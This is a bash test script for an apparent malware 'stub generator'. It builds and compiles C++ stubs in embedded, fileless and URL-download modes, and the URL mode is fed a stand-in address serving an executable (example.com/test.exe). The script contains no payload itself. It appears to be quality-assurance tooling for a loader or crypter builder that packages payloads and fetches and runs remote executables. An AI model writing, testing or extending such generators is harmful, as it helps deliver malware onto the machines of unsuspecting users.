#!/bin/bash

echo "=== Testing All Unified Stub Generator Modes ==="
echo ""

# Test 1: Embedded mode
echo "1. Testing embedded mode..."
./unified_stub_generator test_payload test_embedded_final.cpp
if g++ -O2 -o test_embedded_final test_embedded_final.cpp -pthread 2>/dev/null; then
    echo "   ✓ Embedded mode compiles successfully"
else
    echo "   ✗ Embedded mode compilation failed"
fi

# Test 2: Fileless mode
echo ""
echo "2. Testing fileless mode..."
printf "2\ny\ny\n1\ny\nn\ny\ny\nn\ny\ny\ny\n" | ./unified_stub_generator test_payload test_fileless_final.cpp --config >/dev/null 2>&1
if g++ -O2 -o test_fileless_final test_fileless_final.cpp -pthread 2>/dev/null; then
    echo "   ✓ Fileless mode compiles successfully"
else
    echo "   ✗ Fileless mode compilation failed"
fi

# Test 3: URL download mode
echo ""
echo "3. Testing URL download mode..."
printf "3\nhttps://example.com/test.exe\ny\ny\n1\ny\nn\ny\nn\nn\ny\nn\ny\n" | ./unified_stub_generator --url test_url_final.cpp --config >/dev/null 2>&1
if g++ -O2 -o test_url_final test_url_final.cpp -pthread 2>/dev/null; then
    echo "   ✓ URL download mode compiles successfully"
else
    echo "   ✗ URL download mode compilation failed"
fi

echo ""
echo "=== Test Summary ==="
ls -la test_*_final 2>/dev/null | grep -v ".cpp" | wc -l | xargs echo "Successfully compiled stubs:"